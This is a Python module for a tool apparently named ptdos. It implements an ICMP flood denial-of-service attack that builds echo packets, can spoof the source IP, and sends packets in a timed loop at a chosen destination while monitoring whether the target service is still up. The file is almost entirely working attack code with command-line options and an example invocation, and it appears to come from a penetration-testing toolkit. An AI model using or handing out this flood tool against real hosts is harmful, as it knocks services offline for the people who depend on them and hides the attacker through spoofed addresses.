"""ptdos extension that adds a ICMP Flood attack."""
# sudo python3 ptdos.py -a icmpflood -d 4 -dst 192.168.0.80 --data-length 128 -ss --json -st 0.001

# own libs
from infrastructure import factory
from misc.pt_ip import create_ip_packet, set_src_ip
from misc.pt_socket import create_socket
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from misc.pt_icmp import create_icmp_packet
# external libs
from dataclasses import dataclass
from socket import error
from ptlibs.ptmisclib import out_if, ptprint, out_ifnot
from time import time, asctime, sleep


@dataclass
class IcmpFlood:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        payload_len = args['datalength']
        spoof_src = args['spoof-source']
        sleeptime = args['sleeptime']
        packets = 0
        src = set_src_ip(spoof_src)

        # initialize icmp socket
        sock = create_socket(self.name)

        # Create a new ICMP packet of type ECHO.
        icmp = create_icmp_packet(self.name, payload_len)

        # Create a new IP packet
        ip = create_ip_packet(src, dst, icmp)

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            make_ip_packet = ip.get_packet()

            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    sock.close()  # stop attack
                    monitoringprocess()  # stop checkservice end monitoring
                    att_end_t_asc = asctime()  # save attack's ending time
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                # do the ICMP flood attack
                try:
                    # Send it to the target host.
                    sock.sendto(make_ip_packet, (dst, 1))
                    packets += 1
                    sleep(sleeptime)

                except error as serr:
                    ptprint(out_ifnot(f"Close socket due to {serr}.", "ERROR", use_json))
                    sock.close()  # close socket
                    sleep(0.25)  # wait for closing socket
                    ptprint(out_ifnot("Create new socket.", "INFO", use_json))
                    sock = create_socket(self.name)
                    ptprint(out_ifnot(f"Continue {self.name} attack with new socket.", "INFO", use_json))

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, packets)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            sock.close()  # stop attack
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"ICMP Flood attack options": [
                ["NOTE: Run this DoS with sudo."],
                ["-a", "--attack", "<attack>", "Attack name - icmpflood"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify destination IP."],
                ["-dl", "--data-length", "<datalength>", "Include len random bytes as payload. Default 1024 bytes."],
                ["-ss", "--spoof-source", "<spoof-source>", "Spoof source IP address with fake value."],
                ["-st", "--sleep-time", "<sleeptime>", "Time in seconds between ICMP packets. Default 0 seconds."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("icmpflood", IcmpFlood)
